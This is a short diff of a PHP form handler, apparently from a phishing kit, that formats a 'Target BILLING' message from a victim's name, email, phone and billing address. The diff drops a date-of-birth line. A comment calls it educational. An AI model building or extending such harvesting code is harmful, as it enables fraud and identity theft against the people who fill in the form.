@@ -17,7 +17,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // For educational purposes, here's how you might format a message
     $message = " =========Target BILLING============" . 
     "\nFULL NAME : " . $name . 
-    "\nDOB : : " . $dob . 
     "\nEMAIL ADD : " . $email .
     "\nPHONE NUM : " . $phone .
     "\nBILLING 1 : " . $add .
